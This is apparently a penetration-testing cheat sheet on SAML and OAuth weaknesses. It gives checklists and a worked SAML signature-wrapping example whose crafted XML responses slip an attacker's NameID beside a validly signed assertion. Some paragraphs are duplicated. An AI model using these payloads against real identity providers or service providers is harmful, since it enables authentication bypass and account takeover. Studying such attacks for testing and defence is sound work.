# SAML / OAUTH

## SAML Checklist

* Signature stripping
* Comment injection inside user : \<!--1--> or with encoding
* Search lib used and discover key
* Service Provider does not check the certificate's fingerprint then attackers can provide their own certificate with a matching signature, and the application will trust the signature.
* Since the Service Provider #2 does not check the claim, we will need to get a claim issued for the Service Provider #1 and pass it to Service Provider #2.
* SAMLResponse from one Service Provider to another Service Provider. Identify with service 2 and forward it to service 1
* SAML wrapping

### SAML Wrapping

When the Identity Provider sends the SAMLResponse to the Service Provider, the Service Provider needs to do two things: Verify the signature&#x20;

Get the information from the message SAML Wrapping attacks are relying on the fact that step #2 may not be parsing the XML message in the same way as step #1. If we take a simplified version of the SAMLResponse:

```xml
<samlp:Response>
  <Assertion ID="_9eb16cd0-5fd9-0135-899f-0242ac110029">
    <ds:Signature>
      <ds:SignedInfo>
        <ds:Reference URI="#_9eb16cd0-5fd9-0135-899f-0242ac110029">
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>...</ds:SignatureValue>
    </ds:Signature>
    <Subject>
      <NameID>louis@example.org</NameID>
    </Subject>
  </Assertion>
</samlp:Response>

```

SignedInfo pointing to the Assertion that was signed. Implementations should rely on this reference to fetch the NameID. The issue here comes from the fact that when retrieving the NameID, the SAML library or the application leveraging the SAML library may not return the same NameID as the one it verified.&#x20;

The attack For this challenge, the application will use the first NameID it can find in the SAMLResponse. Therefore you will need to craft a SAMLResponse that looks something like:

```xml
<samlp:Response>
  <Assertion ID="whatever_you_want">
    <Subject>
      <NameID>hacker@example.org</NameID>
    </Subject>
  </Assertion>
  <Assertion ID="_9eb16cd0-5fd9-0135-899f-0242ac110029">
    <ds:Signature>
      <ds:SignedInfo>
        <ds:Reference URI="#_9eb16cd0-5fd9-0135-899f-0242ac110029">
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>...</ds:SignatureValue>
    </ds:Signature>
    <Subject>
      <NameID>louis@example.org</NameID>
    </Subject>
  </Assertion>
</samlp:Response>
```

You will obviously need to base this SAMLResponse from the initial SAMLResponse and most fields not showed in the XML above should be kept

When the Identity Provider sends the SAMLResponse to the Service Provider, the Service Provider needs to do two things:&#x20;

* Verify the signature&#x20;
* Get the information&#x20;

from the message SAML Wrapping attacks are relying on the fact that step #2 may not be parsing the XML message in the same way as step #1. If we take a simplified version of the SAMLResponse:

```xml
/<samlp:Response>
  <Assertion ID="_9eb16cd0-5fd9-0135-899f-0242ac110029">
    <ds:Signature>
      <ds:SignedInfo>
        <ds:Reference URI="#_9eb16cd0-5fd9-0135-899f-0242ac110029">
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>...</ds:SignatureValue>
    </ds:Signature>
    <Subject>
      <NameID>louis@example.org</NameID>
    </Subject>
  </Assertion>
</samlp:Response>
```

We can see that there is a Reference in the SignedInfo pointing to the Assertion that was signed. Implementations should rely on this reference to fetch the NameID. The issue here comes from the fact that when retrieving the NameID, the SAML library or the application leveraging the SAML library may not return the same NameID as the one it verified.

```xml
<samlp:Response>
  <Assertion ID="_9eb16cd0-5fd9-0135-899f-0242ac110029">
    <ds:Signature>
      <ds:SignedInfo>
        <ds:Reference URI="#_9eb16cd0-5fd9-0135-899f-0242ac110029">
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>...</ds:SignatureValue>
    </ds:Signature>
    <Subject>
      <NameID>louis@example.org</NameID>
    </Subject>
  </Assertion>
  <Assertion ID="whatever_you_want">
    <Subject>
      <NameID>hacker@example.org</NameID>
    </Subject>
  </Assertion>
</samlp:Response>
```

You will obviously need to base this SAMLResponse from the initial SAMLResponse and most fields not showed in the XML above should be kept

## OAUTH Checklist

* Authorization Server CSRF
* Authorization Server OpenRedirect [https://sec.okta.com/articles/2021/02/stealing-oauth-tokens-open-redirects/](https://sec.okta.com/articles/2021/02/stealing-oauth-tokens-open-redirects/)
* Authorization state fixation
* Authorization server XSS (CSRF bypass)
